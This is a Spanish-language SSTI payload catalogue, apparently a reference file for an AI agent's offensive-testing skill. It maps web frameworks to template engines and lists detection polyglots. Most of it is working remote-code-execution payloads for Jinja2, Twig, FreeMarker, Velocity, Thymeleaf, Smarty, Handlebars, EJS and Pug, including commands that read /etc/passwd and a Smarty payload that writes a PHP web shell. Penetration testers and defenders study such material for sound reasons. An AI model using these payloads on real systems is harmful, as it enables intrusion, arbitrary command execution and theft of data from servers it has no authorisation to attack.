# SSTI — catálogo por motor

Cargar solo después de acotar el motor candidato con el polyglot de
detección (paso 2 del SKILL.md). No volcar el catálogo entero contra
el target — elegir el motor identificado y probar su sección.

## Fingerprint framework → motor por default

| Framework | Lenguaje | Motor por default | Nota |
|---|---|---|---|
| Flask | Python | Jinja2 | También Jinja2 standalone, Ansible templates |
| Django | Python | Django Template Language | Sandbox más restrictivo que Jinja2 — menos gadgets disponibles |
| Spring Boot | Java | Thymeleaf (si usa SpEL), FreeMarker, Velocity | Verificar cuál está activo, pueden coexistir |
| Symfony | PHP | Twig | |
| Laravel | PHP | Blade | Blade compila a PHP plano — RCE vía `{{ }}` es raro, pero `@php` blocks si el atacante controla el template source sí |
| Express/Node | JS | EJS, Pug, Handlebars, Nunjucks, Mustache | Mustache es "logic-less" por diseño — SSTI limitado ahí salvo helpers custom |
| ColdFusion | CFML | CFML nativo | `#` delimitadores, sintaxis propia |
| Struts (legado) | Java | OGNL (no es template engine per se, pero mismo patrón de evaluación de expresión) | CVE-2017-5638 y relacionados son esta familia |

## Polyglots de detección → qué motor sugiere

| Fragmento que desaparece/evalúa | Motor sugerido |
|---|---|
| `${{<%[%'"}}%\.` completo sin error | Probar backend genérico, no concluyente solo |
| `{{` se evalúa, `${` no | Jinja2, Twig, Django |
| `${` se evalúa, `{{` no | FreeMarker, Velocity (con `$`), JSP EL |
| `#{` se evalúa | Thymeleaf con SpEL habilitado |
| `<%=` se evalúa | ERB, EJS, ASP clásico |
| Ninguno evalúa pero aparece error de sintaxis específico del motor en la respuesta (ej: mensaje con "Jinja2" o "FreeMarker" en el texto) | Usar el nombre del motor en el error directamente, no hace falta polyglot |

## Payloads de detección aritmética (checkpoint, no finding)

```
{{7*7}}                    → Jinja2, Twig, Nunjucks: 49
{{7*'7'}}                  → Jinja2: '7777777' (string repetido) — distingue Jinja2 de Twig, que da error con este
${7*7}                     → FreeMarker, Velocity, JSP EL: 49
#{7*7}                     → Thymeleaf (SpEL): 49
<%= 7*7 %>                 → ERB, EJS: 49
${{7*7}}                   → Algunos motores anidados/mal configurados: 49
```

## Escalación a RCE por motor

### Jinja2 (Python/Flask)

```python
# Vía __class__ walk clásico (funciona en la mayoría de versiones sin sandbox)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Alternativa sin 'self' si el contexto no lo expone
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Buscar en el output un índice de subclass útil (ej: subprocess.Popen, os._wrap_close)
# y luego:
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}

# Si hay sandbox (Jinja2 SandboxedEnvironment): el ataque cambia a buscar
# atributos no bloqueados por la sandbox — no hay bypass universal,
# depende de qué atributos específicos bloqueó la config. Documentar
# el bloqueo exacto observado como killer si no hay vía.
```

### Twig (PHP/Symfony)

```
{{ ['id'] | map('system') }}
{{ ['id'] | filter('system') }}
{{ ['cat /etc/passwd'] | map('system') }}
# Versiones viejas de Twig (<1.x con sandbox mal configurado):
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
```

### FreeMarker (Java)

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}

# Alternativa si 'new()' está restringido:
<#assign value="freemarker.template.utility.Execute"?new()("id")>${value}
```

### Velocity (Java)

```
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass().forName("java.lang.String")).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")

# Via ObjectTools si el contexto expone acceso a clases (menos común en Velocity moderno)
```

### Thymeleaf (Spring, con SpEL habilitado)

```
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
*{T(java.lang.Runtime).getRuntime().exec('id')}
# Nota: Thymeleaf por default NO evalúa SpEL arbitrario fuera de
# atributos th:* específicos — confirmar primero que el input llega
# a un contexto th:text/th:utext/th:each antes de asumir que #{} o
# *{} son evaluables desde cualquier posición.
```

### Smarty (PHP)

```
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}
```

### Handlebars (Node) — requiere helper custom explotable

Handlebars "logic-less" no ejecuta código arbitrario por default. SSTI
real requiere:
- Un helper custom registrado por la app que evalúe strings como código
  (patrón de desarrollo malo, no default del motor)
- O acceso al "compile" API server-side con opción `{strict: false}` que
  permita prototype access

```
{{#with "constructor"}}{{#with split}}{{pop}}{{push "return process.mainModule.require('child_process').execSync('id');"}}{{pop}}{{#each (call (apply constructor.constructor (join "")))}}{{/each}}{{/with}}{{/with}}
```

### EJS (Node)

```
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

### Pug (Node) — requiere `pug.compile(userInput)` server-side

```
#{global.process.mainModule.require('child_process').execSync('id')}
```

## Sandbox bypass — no asumir universal

No existe un bypass genérico de sandbox que funcione siempre. Si el
motor tiene sandbox activo (Jinja2 `SandboxedEnvironment`, Django
Template Language por diseño, Thymeleaf fuera de contextos `th:*`),
documentar exactamente qué se bloqueó (atributo específico, excepción
levantada, mensaje de error) y marcarlo como candidato de alta
confianza sin RCE confirmado, no como MUERTO — el sandbox puede tener
gaps no catalogados acá.
